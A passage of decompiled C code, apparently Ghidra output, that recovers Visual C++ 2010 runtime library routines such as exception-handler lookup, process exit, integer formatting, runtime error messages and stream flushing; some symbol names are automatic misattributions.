// Library: Visual Studio 2010 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,unsigned_char param_6,int param_7,EHRegistrationNode *param_8)

{
  uint uVar1;
  int *piVar2;
  _s_FuncInfo *p_Var3;
  HandlerType **ppHVar4;
  bool bVar5;
  _ptiddata p_Var6;
  int iVar7;
  unsigned_char uVar8;
  _s_TryBlockMapEntry *p_Var9;
  EHRegistrationNode *unaff_EBX;
  int iVar10;
  _s_FuncInfo *p_Var11;
  int unaff_ESI;
  _s_FuncInfo *p_Var12;
  _s_TryBlockMapEntry *unaff_EDI;
  HandlerType **ppHVar13;
  EHRegistrationNode *pEVar14;
  unsigned_char in_stack_ffffffc8;
  uint local_24;
  HandlerType **local_20;
  HandlerType *local_1c;
  int local_18;
  uint local_14;
  HandlerType *local_10;
  HandlerType *local_c;
  char local_5;
  
  p_Var11 = param_5;
  local_5 = '\0';
  if (param_5->maxState < 0x81) {
    local_c = (HandlerType *)(int)(char)param_2[8];
  }
  else {
    local_c = *(HandlerType **)(param_2 + 8);
  }
  if (((int)local_c < -1) || (param_5->maxState <= (int)local_c)) {
    _inconsistency();
  }
  p_Var12 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 == -0x1f928c9d) {
    if (((*(int *)(param_1 + 0x10) == 3) &&
        (((iVar7 = *(int *)(param_1 + 0x14), iVar7 == 0x19930520 || (iVar7 == 0x19930521)) ||
         (iVar7 == 0x19930522)))) && (*(int *)(param_1 + 0x1c) == 0)) {
      p_Var6 = __getptd();
      if (p_Var6->_curexception == (void *)0x0) {
        return;
      }
      p_Var6 = __getptd();
      p_Var12 = (_s_FuncInfo *)p_Var6->_curexception;
      param_1 = (EHExceptionRecord *)p_Var12;
      p_Var6 = __getptd();
      param_3 = (_CONTEXT *)p_Var6->_curcontext;
      iVar7 = _ValidateRead(p_Var12,1);
      if (iVar7 == 0) {
        _inconsistency();
      }
      if ((((p_Var12->magicNumber_and_bbtFlags == 0xe06d7363) &&
           (p_Var12->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
          ((uVar1 = p_Var12->nIPMapEntries, uVar1 == 0x19930520 ||
           ((uVar1 == 0x19930521 || (uVar1 == 0x19930522)))))) &&
         (p_Var12->pESTypeList == (ESTypeList *)0x0)) {
        _inconsistency();
      }
      p_Var6 = __getptd();
      if (p_Var6->_curexcspec != (void *)0x0) {
        p_Var6 = __getptd();
        piVar2 = (int *)p_Var6->_curexcspec;
        p_Var6 = __getptd();
        iVar7 = 0;
        p_Var6->_curexcspec = (void *)0x0;
        uVar8 = IsInExceptionSpec(param_1,(_s_ESTypeList *)unaff_EDI);
        p_Var12 = (_s_FuncInfo *)param_1;
        if ((char)uVar8 == '\0') {
          iVar10 = 0;
          if (0 < *piVar2) {
            do {
              bVar5 = type_info::operator__
                                (*(type_info **)(iVar10 + 4 + piVar2[1]),
                                 (type_info *)&class_std__bad_exception_RTTI_Type_Descriptor);
              if (bVar5 != false) goto LAB_003b510f;
              iVar7 = iVar7 + 1;
              iVar10 = iVar10 + 0x10;
            } while (iVar7 < *piVar2);
          }
          goto LAB_003b510a;
        }
      }
    }
    p_Var11 = param_5;
    if (((p_Var12->magicNumber_and_bbtFlags == 0xe06d7363) &&
        (p_Var12->pTryBlockMap == (TryBlockMapEntry *)0x3)) &&
       ((uVar1 = p_Var12->nIPMapEntries, uVar1 == 0x19930520 ||
        ((uVar1 == 0x19930521 || (uVar1 == 0x19930522)))))) {
      if ((param_5->nTryBlocks != 0) &&
         (p_Var9 = _GetRangeOfTrysToCheck(param_5,param_7,(int)local_c,&local_14,&local_24),
         local_14 < local_24)) {
        ppHVar13 = &p_Var9->pHandlerArray;
        do {
          local_20 = ppHVar13;
          if ((ppHVar13[-4] == local_c || (int)ppHVar13[-4] < (int)local_c) &&
             ((int)local_c <= (int)ppHVar13[-3])) {
            local_10 = *ppHVar13;
            ppHVar4 = ppHVar13;
            for (local_1c = ppHVar13[-1]; local_20 = ppHVar13, 0 < (int)local_1c;
                local_1c = (HandlerType *)((int)&local_1c[-1].addressOfHandler + 3)) {
              p_Var11 = (_s_FuncInfo *)p_Var12->pESTypeList[1].pTypeArray;
              local_20 = ppHVar4;
              for (local_18 = p_Var11->magicNumber_and_bbtFlags; 0 < local_18;
                  local_18 = local_18 + -1) {
                p_Var11 = (_s_FuncInfo *)((int)p_Var11 + 4);
                p_Var3 = *(_s_FuncInfo **)p_Var11;
                iVar7 = ___TypeMatch((byte *)local_10,(byte *)p_Var3,(uint *)p_Var12->pESTypeList);
                if (iVar7 != 0) {
                  local_5 = '\x01';
                  CatchIt((EHExceptionRecord *)p_Var12,(EHRegistrationNode *)param_3,
                          (_CONTEXT *)param_4,param_5,p_Var3,(_s_HandlerType *)param_7,
                          (_s_CatchableType *)param_8,unaff_EDI,unaff_ESI,unaff_EBX,
                          in_stack_ffffffc8);
                  p_Var12 = (_s_FuncInfo *)param_1;
                  goto LAB_003b5247;
                }
              }
              local_10 = local_10 + 1;
              ppHVar4 = local_20;
            }
          }
LAB_003b5247:
          local_14 = local_14 + 1;
          ppHVar13 = local_20 + 5;
          p_Var11 = param_5;
          local_20 = ppHVar13;
        } while (local_14 < local_24);
      }
      if ((char)param_6 != '\0') {
        ___DestructExceptionObject((int *)p_Var12);
      }
      if ((((local_5 != '\0') || ((p_Var11->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930521)) ||
          (p_Var11->pESTypeList == (ESTypeList *)0x0)) ||
         (uVar8 = IsInExceptionSpec((EHExceptionRecord *)p_Var12,(_s_ESTypeList *)unaff_EDI),
         (char)uVar8 != '\0')) goto LAB_003b5327;
      __getptd();
      __getptd();
      p_Var6 = __getptd();
      p_Var6->_curexception = p_Var12;
      p_Var6 = __getptd();
      p_Var6->_curcontext = param_3;
      pEVar14 = param_8;
      if (param_8 == (EHRegistrationNode *)0x0) {
        pEVar14 = param_2;
      }
      _UnwindNestedFrames(pEVar14,(EHExceptionRecord *)p_Var12);
      p_Var12 = param_5;
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
      FUN_003b4a5f(p_Var12->pESTypeList);
      p_Var11 = param_5;
    }
  }
  if (p_Var11->nTryBlocks != 0) {
    if ((char)param_6 != '\0') {
LAB_003b510a:
      terminate();
LAB_003b510f:
      ___DestructExceptionObject((int *)param_1);
      param_1 = (EHExceptionRecord *)s_bad_exception_003c72a8;
      std::exception::exception((exception *)&stack0xffffffc8,(char **)&param_1);
                    // WARNING: Subroutine does not return
      __CxxThrowException_8(&stack0xffffffc8,&DAT_003d2dac);
    }
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var12,param_2,param_3,param_4,p_Var11,(int)local_c,param_7,
               param_8);
  }
LAB_003b5327:
  p_Var6 = __getptd();
  if (p_Var6->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  return;
}



undefined ** __thiscall FUN_003b533f(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_exception::vftable;
  return (undefined **)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7,uint param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((param_5->magicNumber_and_bbtFlags & 0x1fffffff) < 0x19930522 ||
      ((*(byte *)&param_5->EHFlags & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5->nTryBlocks != 0) ||
         ((0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff) &&
          (param_5->pESTypeList != (ESTypeList *)0x0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8 & 0xff)
          ;
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,param_5,param_8,param_6,
                    param_7);
      }
    }
    else {
      if ((param_5->maxState != 0) && (param_6 == 0)) {
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
      }
    }
  }
  return 1;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2010 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  
  iVar2 = FUN_003bce10();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if (((byte)DAT_003d6660 & 2) != 0) {
    __call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __set_abort_behavior
// 
// Library: Visual Studio 2010 Release

uint __cdecl __set_abort_behavior(uint _Flags,uint _Mask)

{
  uint uVar1;
  
  uVar1 = DAT_003d6660;
  DAT_003d6660 = ~_Mask & DAT_003d6660 | _Flags & _Mask;
  return uVar1;
}



// Library Function - Single Match
//  _xtoa_s@20
// 
// Library: Visual Studio 2010 Release

int __thiscall _xtoa_s_20(void *this,uint param_1,uint param_2,int param_3)

{
  ulonglong uVar1;
  char *pcVar2;
  uint in_EAX;
  int *piVar3;
  char *pcVar4;
  char cVar5;
  uint uVar6;
  char *pcVar7;
  int iStack20;
  
  if (this == (void *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_003b60f9();
    return 0x16;
  }
  if (param_1 == 0) {
LAB_003b54c1:
    piVar3 = __errno();
    iStack20 = 0x16;
  }
  else {
    *(undefined *)this = 0;
    if ((param_3 != 0) + 1 < param_1) {
      if (0x22 < param_2 - 2) goto LAB_003b54c1;
      pcVar7 = (char *)this;
      if (param_3 != 0) {
        *(undefined *)this = 0x2d;
        pcVar7 = (char *)((int)this + 1);
        in_EAX = -in_EAX;
      }
      uVar6 = (uint)(param_3 != 0);
      pcVar2 = pcVar7;
      do {
        pcVar4 = pcVar2;
        uVar1 = (ulonglong)in_EAX;
        in_EAX = in_EAX / param_2;
        cVar5 = (char)(uVar1 % (ulonglong)param_2);
        if ((uint)(uVar1 % (ulonglong)param_2) < 10) {
          cVar5 = cVar5 + '0';
        }
        else {
          cVar5 = cVar5 + 'W';
        }
        *pcVar4 = cVar5;
        uVar6 = uVar6 + 1;
      } while ((in_EAX != 0) && (pcVar2 = pcVar4 + 1, uVar6 < param_1));
      if (uVar6 < param_1) {
        pcVar4[1] = '\0';
        do {
          cVar5 = *pcVar4;
          *pcVar4 = *pcVar7;
          pcVar4 = pcVar4 + -1;
          *pcVar7 = cVar5;
          pcVar7 = pcVar7 + 1;
        } while (pcVar7 < pcVar4);
        return 0;
      }
      *(undefined *)this = 0;
    }
    piVar3 = __errno();
    iStack20 = 0x22;
  }
  *piVar3 = iStack20;
  FUN_003b60f9();
  return iStack20;
}



// Library Function - Single Match
//  __itoa_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __itoa_s(int _Value,char *_DstBuf,size_t _Size,int _Radix)

{
  int iVar1;
  
  if ((_Radix == 10) && (_Value < 0)) {
    iVar1 = 1;
    _Radix = 10;
  }
  else {
    iVar1 = 0;
  }
  iVar1 = _xtoa_s_20(_DstBuf,_Size,_Radix,iVar1);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_003d8028;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_003d8024;
    do {
      piVar2 = piVar1;
      if (DAT_003d8028 == (int *)0x0) goto LAB_003b5891;
      piVar1 = DAT_003d8028;
    } while (*DAT_003d8028 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_003d8028[1];
    _free(_Memory);
LAB_003b5891:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_003b58b4();
  return;
}



void FUN_003b58b4(void)

{
  FUN_003b8677(0xe);
  return;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2010 Release

int __cdecl __heap_init(void)

{
  hHeap_003d802c = HeapCreate(0,0x1000,0);
  return (uint)(hHeap_003d802c != (HANDLE)0x0);
}



void __cdecl FUN_003b58db(undefined4 param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



void FUN_003b5906(UINT param_1)

{
  FUN_003b58db(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_003b591e(void)

{
  __lock(8);
  return;
}



void FUN_003b5927(void)

{
  FUN_003b8677(8);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2010 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_003b779f();
  FUN_003b5dd4(uVar1);
  FUN_003b5f6f(uVar1);
  FUN_003ba65c(uVar1);
  FUN_003bd05d(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_003ba6ef();
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2010 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  code **ppcVar3;
  
  BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_003d1c70);
  if (BVar1 != 0) {
    __fpmath(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_003c61cc,(undefined **)&DAT_003c61e8);
  if (iVar2 == 0) {
    _atexit(&LAB_003ba3ef);
    ppcVar3 = (code **)&DAT_003c6194;
    do {
      if (*ppcVar3 != (code *)0x0) {
        (**ppcVar3)();
      }
      ppcVar3 = ppcVar3 + 1;
    } while (ppcVar3 < &DAT_003c61c8);
    if ((_DAT_003ea170 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage(&DAT_003ea170), BVar1 != 0)) {
      (*_DAT_003ea170)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x003b5b4f)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2010 Release

void __cdecl _doexit(UINT param_1,int param_2,int param_3)

{
  PVOID *ppvVar1;
  PVOID *ppvVar2;
  PVOID pvVar3;
  code *pcVar4;
  PVOID *ppvVar5;
  PVOID *ppvVar6;
  PVOID *local_34;
  PVOID *local_2c;
  PVOID *local_28;
  code **local_24;
  code **local_20;
  
  __lock(8);
  if (_DAT_003d8060 != 1) {
    _DAT_003d805c = 1;
    DAT_003d8058 = (undefined)param_3;
    if (param_2 == 0) {
      ppvVar1 = (PVOID *)DecodePointer(Ptr_003ea168);
      if (ppvVar1 != (PVOID *)0x0) {
        ppvVar2 = (PVOID *)DecodePointer(Ptr_003ea164);
        local_34 = ppvVar1;
        local_2c = ppvVar2;
        local_28 = ppvVar1;
        while (ppvVar2 = ppvVar2 + -1, ppvVar1 <= ppvVar2) {
          pvVar3 = (PVOID)FUN_003b779f();
          if (*ppvVar2 != pvVar3) {
            if (ppvVar2 < ppvVar1) break;
            pcVar4 = (code *)DecodePointer(*ppvVar2);
            pvVar3 = (PVOID)FUN_003b779f();
            *ppvVar2 = pvVar3;
            (*pcVar4)();
            ppvVar5 = (PVOID *)DecodePointer(Ptr_003ea168);
            ppvVar6 = (PVOID *)DecodePointer(Ptr_003ea164);
            if ((local_28 != ppvVar5) || (ppvVar1 = local_34, local_2c != ppvVar6)) {
              ppvVar1 = ppvVar5;
              ppvVar2 = ppvVar6;
              local_34 = ppvVar5;
              local_2c = ppvVar6;
              local_28 = ppvVar5;
            }
          }
        }
      }
      for (local_20 = (code **)&DAT_003c61ec; local_20 < &DAT_003c61f8; local_20 = local_20 + 1) {
        if (*local_20 != (code *)0x0) {
          (**local_20)();
        }
      }
    }
    for (local_24 = (code **)&DAT_003c61fc; local_24 < &DAT_003c6200; local_24 = local_24 + 1) {
      if (*local_24 != (code *)0x0) {
        (**local_24)();
      }
    }
  }
  FUN_003b5b49();
  if (param_3 == 0) {
    _DAT_003d8060 = 1;
    FUN_003b8677(8);
    FUN_003b5906(param_1);
    return;
  }
  return;
}



void FUN_003b5b49(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_003b8677(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __exit(UINT param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2010 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __GET_RTERRMSG
// 
// Library: Visual Studio 2010 Release

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_003c7b68)[uVar1 * 2]) {
      return (wchar_t *)(&PTR_u_R6002___floating_point_support_n_003c7b6c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x16);
  return (wchar_t *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2010 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  uint uVar1;
  wchar_t *pwVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  uint uVar7;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar8;
  wchar_t *unaff_EBX;
  rsize_t _SizeInWords;
  wchar_t *unaff_ESI;
  wchar_t *unaff_EDI;
  LPDWORD lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  wchar_t *_Src;
  uintptr_t in_stack_fffffe04;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  pwVar2 = __GET_RTERRMSG(param_1);
  _SizeInWords = 0;
  uVar8 = extraout_EDX;
  _Src = pwVar2;
  if (pwVar2 != (wchar_t *)0x0) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 == 1) || ((iVar3 = __set_error_mode(3), iVar3 == 0 && (_DAT_003d64c0 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      uVar8 = extraout_EDX_02;
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar7 = 0;
        do {
          (&stack0xfffffe04)[uVar7] = *(undefined *)(pwVar2 + uVar7);
          if (pwVar2[uVar7] == L'\0') break;
          uVar7 = uVar7 + 1;
        } while (uVar7 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = (LPDWORD)&stack0xfffffe00;
        sVar6 = _strlen(&stack0xfffffe04);
        WriteFile(hFile,&stack0xfffffe04,sVar6,lpNumberOfBytesWritten,lpOverlapped);
        uVar8 = extraout_EDX_03;
      }
    }
    else {
      uVar8 = extraout_EDX_00;
      if (param_1 != 0xfc) {
        eVar4 = _wcscpy_s((wchar_t *)&DAT_003d8068,0x314,L"Runtime Error!\n\nProgram: ");
        if (eVar4 == 0) {
          param_1 = (int)&DAT_003d809a;
          _DAT_003d82a2 = 0;
          DVar5 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_003d809a,0x104);
          _SizeInWords = 0x2fb;
          if (DVar5 != 0) goto LAB_003b5cb6;
          eVar4 = _wcscpy_s((wchar_t *)&DAT_003d809a,0x2fb,L"<program name unknown>");
          if (eVar4 == 0) goto LAB_003b5cb6;
        }
LAB_003b5cb1:
        do {
          __invoke_watson(unaff_EDI,unaff_ESI,unaff_EBX,(uint)_Src,in_stack_fffffe04);
LAB_003b5cb6:
          sVar6 = str_len((wchar_t *)param_1);
          if (0x3c < sVar6 + 1) {
            sVar6 = str_len((wchar_t *)param_1);
            _SizeInWords = _SizeInWords - ((int)(&DAT_003d8024 + sVar6 * 2) - param_1 >> 1);
            eVar4 = _wcsncpy_s((wchar_t *)(&DAT_003d8024 + sVar6 * 2),_SizeInWords,L"...",3);
            if (eVar4 != 0) goto LAB_003b5cb1;
          }
          param_1 = 0x314;
          eVar4 = _wcscat_s((wchar_t *)&DAT_003d8068,0x314,L"\n\n");
        } while ((eVar4 != 0) ||
                (eVar4 = _wcscat_s((wchar_t *)&DAT_003d8068,0x314,_Src), eVar4 != 0));
        ___crtMessageBoxW((LPCWSTR)&DAT_003d8068,L"Microsoft Visual C++ Runtime Library",0x12010);
        uVar8 = extraout_EDX_01;
      }
    }
  }
  terminate_if_debugger_present(uVar1 ^ (uint)&stack0xfffffffc,uVar8,(char)_Src);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2010 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (_DAT_003d64c0 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_003b5dd4(PVOID param_1)

{
  Ptr_003d8690 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2010 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(Ptr_003d8690);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_003b5e31:
    _File_00->_flag = _File_00->_flag | 0x20;
    return 0xffffffff;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_003b5e31;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return 0xffffffff;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = _GOST_KEY_TRANSPORT_it(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = _GOST_KEY_TRANSPORT_it(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_003d6e00;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_003ea060)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) && (lVar7 = __lseeki64((int)_File,0,2), lVar7 == -1))
      goto LAB_003b5f59;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_003b5f59:
  _File_00->_flag = _File_00->_flag | 0x20;
  return 0xffffffff;
}



void __cdecl FUN_003b5f6f(PVOID param_1)

{
  Ptr_003d8698 = param_1;
  return;
}



// Library Function - Single Match
//  __call_reportfault
// 
// Library: Visual Studio 2010 Release

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar4;
  undefined uVar5;
  DWORD local_320;
  undefined4 local_2d4;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_003bd055();
  }
  trim_string((undefined (*) [16])&local_320,0,0x4c);
  uVar5 = 0xdc;
  local_2d4 = 0x10001;
  local_320 = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)&stack0xfffffcd4);
  uVar4 = extraout_EDX;
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_003bd055();
    uVar4 = extraout_EDX_00;
  }
  terminate_if_debugger_present(uVar1 ^ (uint)&stack0xfffffffc,uVar4,uVar5);
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2010 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  __call_reportfault(2,0xc0000417,1);
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(Ptr_003d8698);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x003b60e2. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
  UNRECOVERED_JUMPTABLE = (code *)swi(3);
  (*UNRECOVERED_JUMPTABLE)();
  return;
}



void FUN_003b60f9(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2010 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2010 Release

